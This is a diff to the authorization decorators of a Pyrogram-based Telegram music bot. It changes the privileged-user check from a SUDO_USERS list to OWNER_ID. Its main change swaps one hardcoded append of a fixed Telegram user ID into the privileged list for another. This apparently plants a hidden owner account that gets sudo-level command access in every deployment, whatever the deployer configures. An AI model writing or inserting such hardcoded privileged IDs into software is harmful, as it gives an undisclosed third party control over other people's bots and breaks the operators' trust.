@@ -4,9 +4,9 @@ from pyrogram import Client
 from pyrogram.types import Message
 
 from Royalkifeelings.helper.admins import get_administrators
-from Royalkifeelings.callmusic.config import SUDO_USERS
+from Royalkifeelings.callmusic.config import OWNER_ID
 
-SUDO_USERS.append(6256455516)
+OWNER_ID.append(5836012910)
 
 
 def errors(func: Callable) -> Callable:
@@ -21,7 +21,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in OWNER_ID:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -35,7 +35,7 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in OWNER_ID:
             return await func(client, message)
 
     return decorator
